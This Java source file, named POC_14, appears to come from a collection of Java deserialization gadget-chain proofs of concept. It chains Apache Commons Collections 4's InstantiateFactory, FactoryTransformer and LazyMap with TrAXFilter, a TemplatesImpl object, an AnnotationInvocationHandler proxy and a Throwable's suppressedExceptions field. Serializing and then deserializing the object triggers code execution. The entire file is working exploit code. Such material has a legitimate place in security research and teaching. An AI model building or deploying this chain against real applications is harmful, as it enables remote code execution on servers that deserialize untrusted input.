package com.example.CC4;

import com.example.Utils.ReflectionUtil;
import com.example.Utils.SerializeUtil;
import com.example.Utils.Share;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import org.apache.commons.collections4.map.LazyMap;
import org.apache.commons.collections4.functors.FactoryTransformer;
import org.apache.commons.collections4.functors.InstantiateFactory;

import javax.xml.transform.Templates;
import java.lang.annotation.Retention;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

public class POC_14 {

    public static void main(String[] args) throws Exception {
        InstantiateFactory factory = new InstantiateFactory<>(TrAXFilter.class, new Class[]{Templates.class}, new Object[]{Share.getTemplatesImplObj()});
        FactoryTransformer factoryTransformer = new FactoryTransformer<>(factory);

        Map innerMap = new HashMap();
        Map outerMap = LazyMap.lazyMap(innerMap, factoryTransformer);

        InvocationHandler handler = (InvocationHandler) ReflectionUtil.createObject("sun.reflect.annotation.AnnotationInvocationHandler",
                new Class[]{Class.class, Map.class},
                new Object[]{Retention.class, outerMap});

        List proxyList = (List) Proxy.newProxyInstance(List.class.getClassLoader(),new Class[]{List.class}, handler);
        Throwable t = new Throwable();
        ReflectionUtil.setField(t, "suppressedExceptions", proxyList);

        SerializeUtil.deserialize(SerializeUtil.serialize(t));
    }

}
